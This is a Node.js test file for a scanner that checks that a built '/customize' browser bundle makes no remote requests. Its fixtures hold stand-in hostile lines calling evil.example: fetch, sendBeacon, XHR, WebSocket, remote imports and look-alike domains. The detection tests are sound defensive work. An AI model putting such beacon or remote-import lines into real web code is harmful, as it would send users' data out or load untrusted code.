import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, writeFile, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { scanRemoteRequests } from "../../scripts/browser-secret-scan.mjs";

// Fixtures are written to a temporary directory so the hostile bundles never sit in the repo,
// where `node --check` and the real scans would see them.
async function bundle(files) {
  const dir = await mkdtemp(join(tmpdir(), "3dp-remote-scan-"));
  for (const [name, text] of Object.entries(files)) {
    await mkdir(join(dir, name, ".."), { recursive: true });
    await writeFile(join(dir, name), text);
  }
  return dir;
}
const findingsFor = async files => {
  const dir = await bundle(files);
  try { return await scanRemoteRequests([dir]); } finally { await rm(dir, { recursive: true, force: true }); }
};

test("a bundle that fetches a remote host fails the scan", async () => {
  const found = await findingsFor({ "assets/app.js": "async function x(){return fetch('https://evil.example/x')}" });
  assert.equal(found.length >= 1, true, JSON.stringify(found));
  assert.ok(found.some(f => f.url === "https://evil.example/x" && f.file.endsWith("app.js")), JSON.stringify(found));
});

test("remote requests hidden behind a variable, XHR, imports, beacons, sockets and CSS are caught", async () => {
  const cases = {
    "a.js": "const u=`https://evil.example/collect`;fetch(u)",
    "b.js": "const r=new XMLHttpRequest();r.open(\"POST\",\"https://evil.example/x\")",
    "c.js": "import(\"https://cdn.evil.example/mod.js\")",
    "d.js": "navigator.sendBeacon('//evil.example/b',d)",
    "e.js": "new WebSocket('wss://evil.example/s')",
    "f.js": "importScripts('//evil.example/w.js')",
    "g.css": "@import url(https://fonts.evil.example/x.css);",
    "h.html": "<!doctype html><script src=\"https://cdn.evil.example/x.js\"></script>",
    "i.js": "fetch(\"http://\"+host+\"/x\")"
  };
  const found = await findingsFor(cases);
  for (const name of Object.keys(cases)) assert.ok(found.some(f => f.file.endsWith(name)), `${name} not flagged: ${JSON.stringify(found)}`);
});

test("same-origin, relative, data:, blob: and the 3MF/SVG namespace strings pass", async () => {
  const found = await findingsFor({
    "assets/ok.js": [
      "fetch(`/customize/fonts/${f}`,{credentials:`same-origin`})",
      "fetch(e.href,n)",
      "import(`./viewer3d-abc.js`)",
      "fetch('data:application/octet-stream;base64,AAAA');fetch(URL.createObjectURL(b));fetch('blob:x')",
      "const NS='http://schemas.microsoft.com/3dmanufacturing/core/2015/02';",
      "const R='http://schemas.openxmlformats.org/package/2006/relationships';",
      "const C='http://schemas.openxmlformats.org/package/2006/content-types';",
      "const T='http://schemas.microsoft.com/3dmanufacturing/2013/01/3dmodel';",
      "document.createElementNS(`http://www.w3.org/2000/svg`,`path`);document.createElementNS(`http://www.w3.org/1999/xhtml`,e)",
      "const q={default:`https://3dprint4.me/`}"
    ].join("\n"),
    "index.html": "<!doctype html><link rel=\"canonical\" href=\"https://3dprint4.me/customize/\"><script type=\"module\" src=\"/customize/assets/app.js\"></script>",
    "fonts/LICENSES.md": "See https://github.com/google/fonts and http://scripts.sil.org/OFL",
    "fonts/OFL.txt": "http://scripts.sil.org/OFL"
  });
  assert.deepEqual(found, []);
});

test("a look-alike of an allowed string is not allowed", async () => {
  const found = await findingsFor({
    "x.js": "fetch('https://3dprint4.me.evil.example/x');fetch('http://schemas.microsoft.com.evil.example/a')"
  });
  assert.equal(found.length, 2, JSON.stringify(found));
});

test("the built /customize bundle makes no remote requests", async t => {
  const built = new URL("../../public/customize/", import.meta.url);
  if (!(await stat(built).catch(() => null))) { t.skip("public/customize is not built (npm test builds it first)"); return; }
  assert.deepEqual(await scanRemoteRequests([built]), []);
});
